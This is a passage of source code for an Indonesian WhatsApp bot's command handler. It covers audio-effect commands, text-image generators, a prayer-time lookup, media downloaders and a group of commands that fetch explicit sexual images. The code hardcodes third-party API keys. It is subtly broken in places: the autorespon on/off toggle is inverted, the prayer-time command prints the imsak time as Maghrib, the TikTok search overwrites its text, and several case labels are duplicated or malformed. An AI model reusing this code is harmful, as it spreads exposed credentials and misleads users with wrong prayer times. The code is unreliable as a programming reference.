                    await dha.sendMessage(from, horny2, document, {quoted: mek, mimetype: 'video/mp4', filename: `${yoo.title}.mp4` })
                    await limitAdd(sender)
break
        case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return reply(`Owner Only`)
       if (args.length < 1) return reply(`Penggunaan ${prefix}autorespon on/off`)
           if (q === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (q === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else {
                    reply(mess.error.api)
                }
              await limitAdd(sender)
break
				case 'tag':
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					dha.sendMessage(from, tagq, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
              await limitAdd(sender)
break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					dha.sendMessage(from, tagu, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
              await limitAdd(sender)
break
case 'dadu':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			dha.sendMessage(from, damdu, sticker, {quoted: mek})
			await limitAdd(sender)
break
				case 'robot':
				sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
				sticWait(from)
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await dha.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
await limitAdd(sender)
break
case 'gemuk':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await dha.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true,  quoted:mek})
						fs.unlinkSync(ran)
					})
					await limitAdd(sender)
break
case 'balik':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await dha.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true,  quoted:mek})
fs.unlinkSync(ran)
	})
await limitAdd(sender)
break
case 'bass':                 
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
					encmediao = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediao = await dha.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediao} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediao)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted:mek})
						fs.unlinkSync(ran)
					})
				await limitAdd(sender)
break
case 'tupai':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
									try {
										encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
										media = await dha.downloadAndSaveMediaMessage(encmedia)
										ran = getRandom('.mp3')
										exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
											fs.unlinkSync(media)
											if (err) return reply('Error!')
											hah = fs.readFileSync(ran)
											dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek,duration:99})
											fs.unlinkSync(ran)
											})
											 } catch (e) {	
												reply(mess.error)
												}  	
												await limitAdd(sender)
break
						case 'vibra': 
case 'vibrato':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
									encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
									media = await dha.downloadAndSaveMediaMessage(encmedia)
									ran = getRandom('.mp3')
									exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=16" ${ran}`, (err, stderr, stdout) => {
										fs.unlinkSync(media)
										if (err) return reply('Error!')
										hah = fs.readFileSync(ran)
										dha.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
										fs.unlinkSync(ran)
										})
									await limitAdd(sender)
break
									case 'setnamabot':{
									if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Katashi`)
									dha.updateProfileName(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									 }
              await limitAdd(sender)
break
						case 'setbiobot':{
									 if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
									if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} Katashi`)
									dha.setStatus(q)
									.then((res) => reply('Sukses Lord'))
									.catch((err) => reply('Eror Lord'))
									}
              await limitAdd(sender)
break
									case 'naruto':
									sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pNaruto(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'shadow':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pShadow(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'romantic':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pRomantic(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'smoke':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pSmoke(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'burnpaper':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pBurnPapper(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'lovemsg':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pLoveMsg(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'grass':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pMsgGrass(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'doubleheart':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pDoubleHeart(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'coffecup':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pCoffeCup(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'lovetext':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pLoveText(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break
case 'butterfly':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!q) return reply('teksnya mana?')
pButterfly(`${q}`)
         .then(res => {
    	console.log(res) 
sendMediaURL(from, res.url)
		})
		await limitAdd(sender)
break		
      
      case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.dha.xyz/api/sholat/${daerah}?apikey=PinnBotWibu`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'lolkey':
if (!isOwner)return reply(mess.only.owner)
                    get_result = await fetchJson(`https://api.dha.xyz/api/checkapikey?apikey=PinnBotWibu`)
                    get_result = get_result.result
                    ini_txt = `Username : ${get_result.username}\n`
                    ini_txt += `Requests : ${get_result.requests}\n`
                    ini_txt += `Today : ${get_result.today}\n`
                    ini_txt += `Tipe Akun : ${get_result.account_type}`
                    ini_txt += `Expired : ${get_result.expired}`
                    reply(ini_txt)
              await limitAdd(sender)
break
case 'lolkey2':
if (!isOwner)return reply(mess.only.owner)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=YTRAMLANID`)
                    get_result = get_result.result
                    ini_txt = `Username : ${get_result.username}\n`
                    ini_txt += `Requests : ${get_result.requests}\n`
                    ini_txt += `Today : ${get_result.today}\n`
                    ini_txt += `Tipe Akun : ${get_result.account_type}`
                    ini_txt += `Expired : ${get_result.expired}`
                    reply(ini_txt)
              await limitAdd(sender)
break
case 'hentai':
case 'hentai':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await fetchJson(`https://akaneko-api.herokuapp.com/api/hentai`)
sticWait(from)
im = await getBuffer(x.url)
dha.sendMessage(from, im, image, {quoted: mek})
checkLimit(sender)
await limitAdd(sender)
break
case 'wame':
					reply(`wa.me/${sender.split('@')[0]}\nAtau\napi.whatsapp.com/send?phone=${sender.split('@')[0]}`)
			await limitAdd(sender)
break 
			case 'blocklist':
					teks = 'List Block :\n'
					for (let block of blocked) {
						teks += `~> @${block.split('@')[0]}\n`
					}
					teks += `Total : ${blocked.length}`
					dha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
					await limitAdd(sender)
break 
case 'removebg':
case 'removebg':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  sticWait(from)
	  owgi = await dha.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://tyz-api.herokuapp.com/other/removebg?link=${anu.display_url}`)
	 dha.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	await limitAdd(sender)
break
              case 'kucing':
case 'kucing':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await fetchJson(`https://some-random-api.ml/animal/cat`)
sticWait(from)
ini_txt = `Fact : ${x.fact}\n`
im = await getBuffer(x.image)
dha.sendMessage(from, im, image, {quoted: mek, caption: ini_txt})
await limitAdd(sender)
break
case 'memes':
case 'memes':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await fetchJson(`https://some-random-api.ml/meme`)
sticWait(from)
ini_txt = `Caption : ${x.caption}\n`
im = await getBuffer(x.image)
dha.sendMessage(from, im, image, {quoted: mek, caption: ini_txt})
await limitAdd(sender)
break
case 'asupanmenu':
po1 = dha.prepareMessageFromContent(from, {
  "listMessage":{
"title": "*Asupan nya Kack :v*",
"description": `\nPilih salah satu asupan di bawah ini..`,
"buttonText": "Click Here!",
"listType": "SINGLE_SELECT",
"sections": [
  {
  "title": "Asupan",
      "rows" :[
        {
          "title": "ASUPAN",
          "rowId": `${prefix}asupan`
        },
        {
          "title": "ASUPAN2",
          "rowId": `${prefix}santuy`
        },
        { 
          "title": "ASUPAN3",
          "rowId": `${prefix}ukhty`
        },
        { 
          "title": "ASUPAN4",
          "rowId": `${prefix}bocil`
        },
        {
          "title": "CECAN",
          "rowId": `${prefix}vietnam`
        },
        {
          "title": "CECAN2",
          "rowId": `${prefix}malaysia`
        },
        {
          "title": "CECAN3",
          "rowId": `${prefix}korea`
        },
        {
          "title": "CECAN4",
          "rowId": `${prefix}indonesia`
        },
        {
          "title": "CECAN5",
          "rowId": `${prefix}japan`
        },
        {
          "title": "CECAN6",
          "rowId": `${prefix}thailand`
        },
        {
          "title": "CECAN7",
          "rowId": `${prefix}cecan`
        },
        {
          "title": "CECAN8",
          "rowId": `${prefix}china`
        }
        ]
  }
  ]
}}, {quoted : mek}) 
dha.relayWAMessage(po1, {waitForAck: true})
await limitAdd(sender)
break
case 'darkjokes':
case 'darkjokes':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await fetchJson(`http://hadi-api.herokuapp.com/api/darkjokes`)
sticWait(from)
ini_txt = `Caption : ${x.title}\n`
im = await getBuffer(x.result)
dha.sendMessage(from, im, image, {quoted: mek})
await limitAdd(sender)
break
case 'cecan':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await getBuffer(`http://hadi-api.herokuapp.com/api/randomImage/cecan`)
sticWait(from)
dha.sendMessage(from, x, image, {quoted: mek})
await limitAdd(sender)
break
case 'meme':
case 'meme':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
x = await getBuffer(`https://leyscoders-api.herokuapp.com/api/memeindo?apikey=MIMINGANZ`)
sticWait(from)
dha.sendMessage(from, x, image, {quoted: mek, caption: ini_txt})
await limitAdd(sender)
break
case 'ytsearch':
case 'yts':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    sticWait(from)
                    get_result = await fetchJson(`https://api.dhamzxploit.my.id/api/ytsearch?q=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.watching}\n`
                        ini_txt += `Type : ${x.type}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : ${x.url}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'appstore':
case 'appstore':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    sticWait(from)
                    get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/search/appstore?query=${query}&num=100&page=1`)
                    ini_txt = "AppStore Sesrch"
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Appid : ${x.appId}\n`
                        ini_txt += `Genre : ${x.genres}\n`
                        ini_txt += `Url : ${x.url}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'ahegao':
case 'bdsm,':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'ero':
case 'foot':
case 'ass':
case 'fembom':
case 'gangbang':
case 'glasses,':
case 'jahy':
case 'masturbate':
case 'nsfwneko':
case 'orgy':
case 'panties':
case 'pussy':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                    get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/nsfw/${command}`)
                    fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(get_result.result))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
              imageMsg = ( await dha.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              dha.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              await limitAdd(sender)
break
case 'Kodepos': // Update By KATASHI
case 'kodepos': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} bekasi`)
                    query = args.join(" ")
					data = await fetchJson(`https://api-yogipw.herokuapp.com/api/info/kodepos?kota=${query}`, {method: 'get'})
					teks = 'INFO KODE POS\n'
					for (let x of data.result.data) {
						teks += `*Province:* : ${x.province}\n*Kecamatan* : ${x.subdistrict}\n*Perkotaan* : ${x.urban}\n*Kode* : ${x.postalcode}\n\nINFO KODE POS\n`
					}
					reply(teks.trim())
					    await limitAdd(sender)
break
case 'nhentai':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://tyz-api.herokuapp.com/nsfw/nHentai?code=${henid}`)
                    x = get_result.result
                    get_detail = x.details
                    ini_txt = `Title Romaji : ${x.title}\n`
                    ini_txt += `Title Native : ${x.nativeTitle}\n`
                    ini_txt += `Parodie : ${get_detail.parodies}\n`
                    ini_txt += `Characters : ${get_detail.characters}\n`
                    ini_txt += `Tags : ${get_detail.tags}\n`
                    ini_txt += `Link : ${x.link}\n`
                    ini_txt += `Artist : ${get_detail.artists}\n`
                    ini_txt += `Group : ${get_detail.groups}\n`
                    ini_txt += `Language : ${get_detail.languages}\n`
                    ini_txt += `Categories : ${get_detail.categories}\n`
                    ini_txt += `Uploaded : ${get_detail.uploaded}\n`
                    ini_txt += `Pages : ${x.pages}\n`
                    
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'ttsearch':
case 'tiktoksearch':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} genshin`)
                    query = args.join(" ")
x = await fetchJson(`https://tyz-api.herokuapp.com/search/tiktok?query=${query}`)
x = x.result
sticWait(from)
ini_txt = `Username : ${x.username}\n`
ini_txt = `Caption : ${x.caption}\n`
ini_txt = `Likes : ${x.likes}\n`
ini_txt = `Comment : ${x.comment}\n`
ini_txt = `Share : ${x.share}\n`
ini_txt = `Video : ${x.video}\n`
im = await getBuffer(x.video)
dha.sendMessage(from, im, video, {quoted: mek})
await limitAdd(sender)
break
case 'randomtiktok':
case 'randomtt':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    get_result = await fetchJson(`https://tyz-api.herokuapp.com/search/randomtiktok`)
                    x = get_result.result.creator
                    download = get_result.result.url_dl
                    ini_txt = `Provile : ${x.profile}\n`
                    ini_txt += `User Name : ${x.username}\n`
                    ini_txt += `Description : ${download.desc}\n`
                    ini_txt += `Like : ${download.likes}\n`
                    pidi = await getBuffer(get_result.result.url_dl)
                    dha.sendMessage(from, pidi, video, {quoted: mek})
await limitAdd(sender)
break
					case 'topnews':
case 'topnews':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    get_result = await fetchJson(`https://hujanapi.herokuapp.com/api/topnews?apikey=trial2k21`)
                    get_result = get_result.result
                    ini_txt = 'TOP NEWS :\n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.content}\n`
                        ini_txt += `Author : ${x.author}\n`
                        ini_txt += `Source : ${x.source.name}\n`
                        ini_txt += `Description : ${x.description}\n\n`
                    }
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'ssweb':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} https://mnazria.herokuapp.com/api/screenshotweb?url=www.google.com`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://mnazria.herokuapp.com/api/screenshotweb?url=${query}`)
                    pot = await getBuffer(get_result.gambar)
                    dha.sendMessage(from, pot, image, {quoted: mek})
await limitAdd(sender)
break
case "instagram":
      case "Instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        sticWait(from);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              dha.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              dha.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        await limitAdd(sender)
break;
case 'ytmp4hd':
     case 'ythd':
            if (args.length === 0) return reply(`Kirim perintah */ytmp4 _linkYt_*`)
            let isLinkks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
            if (!isLinkks2) return reply(mess.error.Iv)
            try {
            sticWait(from)
            ythd(args[0])
           .then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res
            axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
           .then((a) => {
            if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟🦈 Title : ${title}\`\`\`
\`\`\`き⃟🦈 Kualitas* : 720p\`\`\`
\`\`\`き⃟🦈 Size* : ${filesizeF}\`\`\`
\`\`\`き⃟🦈 Link* : ${a.data}\`\`\`

_Untuk durasi lebih dari batas disajikan dalam Bentuk link_`)

            const captionsYtmp4 = 
`┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`き⃟🦈 Title : ${title}\`\`\`
\`\`\`き⃟🦈 Kualitas : 720p\`\`\`
\`\`\`き⃟🦈 Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

              sendMediaURL(from, thumb, captionsYtmp4)
              sendMediaURL(from, dl_link,`nih kak`).catch(() => reply(mess.error.api))
})		
})
              } catch (err) {
              reply(`eror`)
}
              await limitAdd(sender)
break
              case 'quot':
					        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              teks = await fetchJson(`https://gist.githubusercontent.com/natebass/b0a548425a73bdf8ea5c618149fe1fce/raw/f4231cd5961f026264bb6bb3a6c41671b044f1f4/quotes.json`)
              sticWait(from)
              await sleep(1000)
               rjppp = teks[Math.floor(Math.random() * teks.length)];
               wo = rjppp.quote
               reply(mess.success)
               await sleep(1000)
dha.sendMessage(from, wo, text, {quoted: mek})
              await limitAdd(sender)
break
case 'bocil':
					        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              teks = await fetchJson(`https://raw.githubusercontent.com/binjaicity/warga62/master/bocil.json`)
              sticWait(from)
              await sleep(1000)
               rjppp = teks[Math.floor(Math.random() * teks.length)];
               wokwik = rjppp.url
               reply(mess.success)
               await sleep(1000)
sendMediaURL(from, wokwik)
              await limitAdd(sender)
break
              case 'quotesimage':
              case 'quotesimg':
              case 'quotimg':
					        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
              teks = await fetchJson(`https://raw.githubusercontent.com/Katashihana/RANDOM-BY-KATASHI/master/quotesimage.json`)
              sticWait(from)
              await sleep(1000)
